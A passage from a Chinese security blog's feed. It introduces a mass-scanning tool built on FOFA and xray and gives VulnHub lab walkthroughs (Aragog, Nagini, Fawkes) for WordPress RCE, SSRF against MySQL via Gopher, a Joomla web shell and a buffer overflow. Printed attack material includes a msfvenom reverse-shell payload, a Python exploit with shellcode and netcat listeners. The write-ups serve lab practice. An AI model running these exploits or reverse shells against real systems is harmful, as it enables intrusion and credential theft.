    <published>2022-11-22T07:49:57.000Z</published>
    <updated>2022-11-22T07:52:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Auto-xray"><a href="#Auto-xray" class="headerlink" title="Auto_xray"></a>Auto_xray</h1><p><strong>工具仅供授权状态下使用,如发生刑事案件,非授权攻击行为于本人无关.望大家熟知《网络安全法》</strong></p><p>因为懒所以写了一个菜鸡缝合怪,缝合fofa xray<br>和fofa2xray差不多,但是我自己在mac端使用fofa2xray体验不是很好,mac端也调用cmd -c,应该是作者调试的时候忘记改了,同时挂服务器上经常跑着跑着就卡住了没反应,不知道是不是我没配置好,索性自己造了个轮子</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>自带mac版的xray1.9.3,其他系统自行替换</p><p>建议部署在linux上,因为windows上的路径文件名和编码可能会导致文件保存出错或者出现乱码</p><p>支持直接使用xray多线程批量扫描指定url列表文件和fofa语法寻找目标扫描需要配置fofa.py中的邮箱 key 搜索语法<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202210262249314.png"></p><p>扫描完成后邮件提醒.需要配置my_email.py中的邮件地址和key<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202210262250753.png"></p><h2 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h2><p>直接扫描url列表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 Auto_xray -t 5 指定线程,默认10 -f urls.txt路径 -e True 开启邮件推送</span><br></pre></td></tr></table></figure><h2 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h2><p>使用fofa批量抓取目标</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 Auto_xray -t 5 指定线程,默认10 -f urls.txt路径 -e True 开启邮件推送 -ff True 开启fofa批量</span><br></pre></td></tr></table></figure><h2 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h2><p>部署到后台持久化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">nohup</span> python3 ./Auto_xray.py  -e True  -ff True &amp;  </span><br></pre></td></tr></table></figure><p>更多详细参数 –help<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202210262248211.png"></p><p>一些默认配置可以修改<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202210262341074.png"></p><p>项目地址:<a href="https://github.com/chencicici/Auto_xray">https://github.com/chencicici/Auto_xray</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Auto-xray&quot;&gt;&lt;a href=&quot;#Auto-xray&quot; class=&quot;headerlink&quot; title=&quot;Auto_xray&quot;&gt;&lt;/a&gt;Auto_xray&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;工具仅供授权状态下使用,如发生刑事案件,非授权攻击行为于本人无关.望大家熟知《网络安全法》&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;因为懒所以写了一个菜鸡缝合怪,缝合fofa xray&lt;br&gt;和fofa2xray差不多,但是我自己在mac端使用fofa2xray体验不是很好,mac端也调用cmd -c,应该是作者调试的时候忘记改了,同时挂服务器上经常跑着跑着就卡住了没反应,不知道是不是我没配置好,索性自己造了个轮子&lt;/p&gt;
&lt;h1 id=&quot;使用&quot;&gt;&lt;a href=&quot;#使用&quot; class=&quot;headerlink&quot; title=&quot;使用&quot;&gt;&lt;/a&gt;使用&lt;/h1&gt;&lt;p&gt;自带mac版的xray1.9.3,其他系统自行替换&lt;/p&gt;</summary>
    
    
    
    <category term="造轮子" scheme="https://syst1m.top/categories/%E9%80%A0%E8%BD%AE%E5%AD%90/"/>
    
    
    <category term="fofa" scheme="https://syst1m.top/tags/fofa/"/>
    
    <category term="xray" scheme="https://syst1m.top/tags/xray/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-Aragog打靶</title>
    <link href="https://syst1m.top/2022/11/14/vulnhub-Aragog%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/11/14/vulnhub-Aragog%E6%89%93%E9%9D%B6/</id>
    <published>2022-11-14T11:00:32.000Z</published>
    <updated>2022-11-15T07:12:26.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>靶机 <a href="https://www.vulnhub.com/entry/harrypotter-aragog-102,688/">https://www.vulnhub.com/entry/harrypotter-aragog-102,688/</a></p><p>靶机ip:192.168.31.199</p><p>攻击机kali:192.168.31.118</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211141905769.png"></p><p>首页没什么东西,先扫一下目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -r -u http://192.168.31.199 -x txt,html,php -w /usr/share/seclists/Discovery/Web-Content/common.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211141907897.png"></p><p>访问blog目录,发现是wordparess</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211141908882.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211141923604.png"></p><p>点击notice,发现跳转到一个域名</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211141924265.png"></p><p>修改hosts解析,成功跳转,页面正常</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211141925408.png"></p><p>用wpscan扫一下,需要token才扫得出漏洞,使用–plugins-detection aggressive 参数,不然那有的漏洞扫不出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordpress.aragog.hogwarts/blog -e p --plugins-detection aggressive --api-token token</span><br></pre></td></tr></table></figure><p>扫出一个插件有rce</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211142320912.png"></p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>msf找一下exp</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211142324683.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211151401988.png"></p><p>成功反弹会话</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>反弹一个半交互式shell,找到一个base64编码的字符串,没啥用</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211151408585.png"></p><p>尝试suid 和sudo提权无果,发现进程里有mysql</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211151414932.png"></p><p>在&#x2F;etc&#x2F;wordpress下找到root密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211151418825.png"></p><p>登录mysql找到一条登录记录 hagrid98 password123</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211151434272.png"></p><p>ssh成功登录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211151438142.png"></p><p>发现一个隐藏文件,应该是用来备份文件的,一般都是定时任务</p><p>写入反弹shell命令</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211151457383.png"></p><p>等待一会,反弹shell</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211151458157.png"></p><p>发现确实是root的定时任务</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211151500562.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;靶机 &lt;a href=&quot;https://www.vulnhub.com/entry/harrypotter-aragog-102,688/&quot;&gt;https://www.vulnhub.com/entry/harrypotter-aragog-102,688/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;靶机ip:192.168.31.199&lt;/p&gt;
&lt;p&gt;攻击机kali:192.168.31.118&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="HARRYPOTTER系列" scheme="https://syst1m.top/tags/HARRYPOTTER%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-Nagini打靶</title>
    <link href="https://syst1m.top/2022/11/10/vulnhub-Nagini%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/11/10/vulnhub-Nagini%E6%89%93%E9%9D%B6/</id>
    <published>2022-11-10T10:09:44.000Z</published>
    <updated>2022-11-14T11:02:04.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub靶场 <a href="https://www.vulnhub.com/entry/harrypotter-nagini,689/">https://www.vulnhub.com/entry/harrypotter-nagini,689/</a></p><p>攻击机kali：192,168.1.11</p><p>靶机：192.168.1.12</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>对靶机进行端口扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211101831531.png"></p><p>看看首页只有一张图，扫一下目录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211101833971.png"></p><p>Joomla cms</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211101834687.png"></p><p>进一步扫目录，扫到一个备份文件,去掉后缀.bak直接打开</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211101843025.png"></p><p>找到数据库配置，但是没用，数据库不允许外链</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211101853030.png"></p><p>线索似乎到这里就断了，没有能利用的地方，msf扫了下cms版本也很高不存在nday，继续信息收集，换个字典用gobuster重新扫目录(换了网络,所以ip变了)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -r -u http://192.168.31.205 -x txt,html,php -w /usr/share/seclists/Discovery/Web-Content/common.txt</span><br></pre></td></tr></table></figure><p>扫出一个新的txt文件</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111409457.png"></p><p>翻译为中文,提示我们需要使用http3去访问这个域名</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111415527.png"></p><p>用docker起了一个http3容器,拿到提示,说访问这个目录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111506046.png"></p><p>访问发现</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111508939.png"></p><h1 id="ssrf打mysql未授权"><a href="#ssrf打mysql未授权" class="headerlink" title="ssrf打mysql未授权"></a>ssrf打mysql未授权</h1><p>发现存在ssrf</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111508436.png"></p><p>结合上面拿到的mysql信息,应该就是通过ssrf打mysql了,需要用到gopher协议</p><p>需要用这个工具去构造gopher payload,工具用python2写的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/tarunkant/Gopherus.git</span><br><span class="line">python2 gopherus.py --exploit mysql</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111551969.png"></p><p>把链接复制放进去,拿到返回结果(没出结果多刷新几次)</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111552593.png"></p><p>继续查询</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111554120.png"></p><p>拿到加密密码,但是解不出,我们可以自己写一个密码进去覆盖掉</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111556736.png"></p><p>构造md5密码(踩坑,看了很多csdn上的wp,都是使用这样的方式去获得md5加密的字符串,这样写进数据库是解析不了的,所以一直登录不进后台,md5sum返回的是文件的hash值用来对比文件是否完整),这样加密的字符串,和在线网站加密的对比不一致,使用md5sum返回的字符串放进数据库里是解析不出来的,无法登录,使用在线网站加密的没问题</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111612007.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111639962.png"></p><p>修改密码(解密为password)</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111639586.png"></p><p>根据上面扫出的路径,去后台登录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111605165.png"></p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>增加一个php</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111701510.png"></p><p>在Extensions -&gt; Templates -&gt; Templates可以编辑模板文件,写反弹马子,或者写一句话都行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111704000.png"></p><p>kali监听,访问 url&#x2F;joomla&#x2F;templates&#x2F;protostar&#x2F;shell.php</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111712630.png"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>在家目录找到一串base64密文,解密为Love@lilly</p><p><img src="https://raw.githubuserontent.com/chencicici/images/main/202211111715095.png"></p><p>在另一个家目录发现一个可执行文件</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111717900.png"></p><p>没有sudo,看一下suid权限,su_cp,根据文件名猜测就是sudo权限的cp命令</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111724602.png"></p><p>尝试登录一下上面那个用户,登录成功,ssh交互式shell舒服一点</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111727579.png"></p><p>有suid的权限,直接复制ssh key到家目录直接免密登录</p><p>先在kali生公钥,在将公钥复制到snape家目录下</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111742676.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111742248.png"></p><p>直接在家目录下新建文件,写入复制的内容,再使用su_cp复制到hermoine用户的ssh目录下(公钥文件权限只能是640)</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111743364.png"></p><p>免密登录hermoine用户</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111745644.png"></p><p>在目录下发现一个隐藏文件夹,这个目录里面包含有火狐浏览器的扩展、用户信息，以及保存到账号密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111750069.png"></p><p>下载firefox信息提取工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/unode/firefox_decrypt.git</span><br></pre></td></tr></table></figure><p>将隐藏文件夹传到kali上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r hermoine@192.168.31.205:/home/hermoine/.mozilla/ /root/ </span><br></pre></td></tr></table></figure><p>然后运行脚本,脚本会自己去找&#x2F;root&#x2F;.mozilla 所以复制过来不需要改密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111757191.png"></p><p>登录成功</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211111801009.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub靶场 &lt;a href=&quot;https://www.vulnhub.com/entry/harrypotter-nagini,689/&quot;&gt;https://www.vulnhub.com/entry/harrypotter-nagini,689/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;攻击机kali：192,168.1.11&lt;/p&gt;
&lt;p&gt;靶机：192.168.1.12&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="HARRYPOTTER系列" scheme="https://syst1m.top/tags/HARRYPOTTER%E7%B3%BB%E5%88%97/"/>
    
    <category term="joomla cms" scheme="https://syst1m.top/tags/joomla-cms/"/>
    
  </entry>
  
  <entry>
    <title>vuln-Fawks打靶</title>
    <link href="https://syst1m.top/2022/11/09/vulnhub-Fawks%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/11/09/vulnhub-Fawks%E6%89%93%E9%9D%B6/</id>
    <published>2022-11-09T10:37:18.000Z</published>
    <updated>2022-11-14T11:02:16.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>靶场来自 <a href="https://www.vulnhub.com/entry/harrypotter-fawkes,686/">https://www.vulnhub.com/entry/harrypotter-fawkes,686/</a></p><p>攻击机：kali 192.168.31.118 靶机：192.168.31.132</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>对靶机进行信息收集</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211091841058.png"></p><p>用nmap -A扫描后发现2222也是ssh端口，9898端口无法访问</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211091849583.png"></p><p>先扫描一下路径，什么都没有</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211091851116.png"></p><p>回到21端口发现存在匿名用户登录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211091857014.png"></p><h1 id="ftp匿名登录"><a href="#ftp匿名登录" class="headerlink" title="ftp匿名登录"></a>ftp匿名登录</h1><p>发现一个 文件，下载下来看看</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211091900533.png"></p><p>用cat查看是乱码，用file看看是个什么东西</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211091902718.png"></p><h1 id="缓存区溢出"><a href="#缓存区溢出" class="headerlink" title="缓存区溢出"></a>缓存区溢出</h1><h2 id="缓存区溢出漏洞"><a href="#缓存区溢出漏洞" class="headerlink" title="缓存区溢出漏洞"></a>缓存区溢出漏洞</h2><p> 缓冲区溢出（buffer overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。</p><p>而缓存区溢出漏洞最重要的就是找出缓存区溢出的位置，这里我们使用edb-debugger调试工具来动态测试server_hogwarts进程并找出缓存区溢出漏洞的溢出位置</p><p>发现是一个elf可执行文件,给一个执行权限执行看看，没有回显</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211091903824.png"></p><p>看看进程，到底是个啥东西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep server</span><br><span class="line">显示名字包含server的所有进程</span><br><span class="line"> </span><br><span class="line">ss -pantu | grep server</span><br><span class="line">用ss查看已经建立的并且名字带有server的连接信息，ss 命令可以用来获取 socket 信息</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211091905651.png"></p><p>发现在本地的9898端口起了一个服务，和最开始nmap扫描出的9898端口一致，暂时不知道用处，监听看看</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211091909034.png"></p><p>输入都无效，到这里思路已经没了，去网上看了公开的<a href="https://blog.csdn.net/qq_63844103/article/details/127275133?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-127275133-blog-124653850.pc_relevant_3mothn_strategy_and_data_recovery&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-127275133-blog-124653850.pc_relevant_3mothn_strategy_and_data_recovery&utm_relevant_index=2">wp</a>  ，打死没想到这里是缓冲区溢出。。。知识盲点</p><h2 id="edb-debugger调试"><a href="#edb-debugger调试" class="headerlink" title="edb-debugger调试"></a>edb-debugger调试</h2><p>edb-debugger是一个跨平台的 AArch32 &#x2F; x86 &#x2F; x86-64 调试器</p><h3 id="关闭防护"><a href="#关闭防护" class="headerlink" title="关闭防护"></a>关闭防护</h3><p>我们是通过ftp服务下载server_hogwarts到本地来调试，目的就是找出它的缓存溢出位置，但是kali本机存在<strong>ALSR安全技术</strong>，地址空间随机化，会造成内存地址的随机化，导致我们无法确定缓冲区溢出的位置。所以要关闭。</p><p>cd到**&#x2F;proc&#x2F;sys&#x2F;kernel<strong>目录下把</strong>randomize_va_space<strong>改成</strong>0**即可</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211091919598.png"></p><h3 id="安装edb-debugger"><a href="#安装edb-debugger" class="headerlink" title="安装edb-debugger"></a>安装edb-debugger</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="built_in">get</span> update</span><br><span class="line">apt-<span class="built_in">get</span> install edb-debugger</span><br></pre></td></tr></table></figure><p>等跑完选确定</p><h3 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h3><p>前面的端口不要断，打开edb，直接在控制台输入edb</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211091927719.png"></p><p>选中刚刚的进程，点击确定</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211091928790.png"></p><p>再点击运行，就可以开始调试了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211091928869.png"></p><h3 id="确认漏洞"><a href="#确认漏洞" class="headerlink" title="确认漏洞"></a>确认漏洞</h3><p>因为我们要来调试缓存区溢出，先构造一些数据，用Python来构造一些脏数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;print(&#x27;asd&#x27;*500)&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092002131.png"></p><p>粘贴到输入框，发现报错</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092003114.png"></p><p>已经调试到了错误位置，即确实存在代码溢出漏洞</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092004775.png"></p><h3 id="寻找溢出位置"><a href="#寻找溢出位置" class="headerlink" title="寻找溢出位置"></a>寻找溢出位置</h3><p>确认了存在缓存区溢出，就需要找到溢出位置，这里不能生成一样的数据，因为需要通过报错来判断溢出位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_create -l 500</span><br></pre></td></tr></table></figure><p>重启edb，重复上面的操作，然后将生成的随机字符丢进去</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092023900.png"></p><p> 此时的报错提示我们<strong>0×64413764</strong>内存位置有问题，那这个位置很有可能就是想找的<strong>溢出位置</strong>，我们来找一下这个内存位置在输入区的位置</p><p>查询溢出位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_offset -l 500 -q 64413764</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092026843.png"></p><p> 可以看到<strong>偏移量</strong>为112，所以64413764就是在113个位置</p><p>看别的师傅公开的wp后面的内容真看不懂，直接跳过生成payload</p><h1 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h1><p>这个生成的payload就是我们用来放进ESP并执行的<strong>反弹shell代码</strong>，但注意这里需要<strong>16进制</strong>的payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.31.118 LPORT=4444 -b <span class="string">&quot;\x00&quot;</span> -f python</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092032931.png"></p><p>根据这个payload写一个exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys,socket</span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xb8\xd4\xbe\xd2\x98\xd9\xc3\xd9\x74\x24\xf4\x5d\x31&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc9\xb1\x12\x31\x45\x12\x03\x45\x12\x83\x39\x42\x30&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x6d\xf0\x60\x42\x6d\xa1\xd5\xfe\x18\x47\x53\xe1\x6d&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x21\xae\x62\x1e\xf4\x80\x5c\xec\x86\xa8\xdb\x17\xee&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x86\x09\xcc\x52\xbe\x33\x0c\xbb\x63\xbd\xed\x0b\xfd&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xed\xbc\x38\xb1\x0d\xb6\x5f\x78\x91\x9a\xf7\xed\xbd&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x69\x6f\x9a\xee\xa2\x0d\x33\x78\x5f\x83\x90\xf3\x41&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x93\x1c\xc9\x02&quot;</span></span><br><span class="line"> </span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">112</span>+<span class="string">&#x27;\x55\x9d\x04\x08&#x27;</span>+<span class="string">&#x27;\x90&#x27;</span>*<span class="number">32</span>+buf</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s=socket.socket()</span><br><span class="line">    s.connect((<span class="string">&#x27;192.168.31.132&#x27;</span>,<span class="number">9898</span>))</span><br><span class="line">    s.send((payload))</span><br><span class="line">    s.close()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;wrong&#x27;</span>)</span><br><span class="line">    sys.exit()</span><br></pre></td></tr></table></figure><p>这里connect连接的是靶机的9898端口 </p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>用nc监听本地4444端口，也就是一开始msf生成的payload端口再执行exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 4444</span><br><span class="line">python2 ./exp.py</span><br></pre></td></tr></table></figure><p>收到shell</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092039255.png"></p><p>反弹一个半交互式shell，发现没python用bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh -i</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092043612.png"></p><p>发现一个隐藏文件，发现一串字符串</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092044566.png"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="容器提权"><a href="#容器提权" class="headerlink" title="容器提权"></a>容器提权</h2><p>目录下这个文件没有执行权，不知道是什么东西</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092048738.png"></p><p>用刚刚的字符串尝试一下ssh,发现密码错误，但是2222端口还有一个ssh，继续尝试，发现成功登录</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">harry</span> HarrYp0tter<span class="variable">@Hogwarts123</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092053518.png"></p><p>发现这个名字，似乎是一个编号，查看ip和我们最开始访问的192.168.31.132不同，似乎是docker容器</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092056279.png"></p><p>判断是否为docker环境，进一步确认</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -alh /.dockerenv <span class="comment">#查看是否存dockerrnv文件</span></span><br><span class="line"><span class="built_in">cat</span> /proc/1/cgroup <span class="comment">#查看系统进程的cgroup信息</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092057159.png"></p><p>继续信息收集，suid和sudo</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092046474.png"></p><p>发现sudo -l 为all，可以直接执行sudo -s拿到root权限</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092102818.png"></p><p>发现flag和一串提示，意思是有人登录ftp，让我们分析流量</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211092103681.png"></p><p>用tcpdump去分析</p><figure class="highlight bash"><table><tr><td 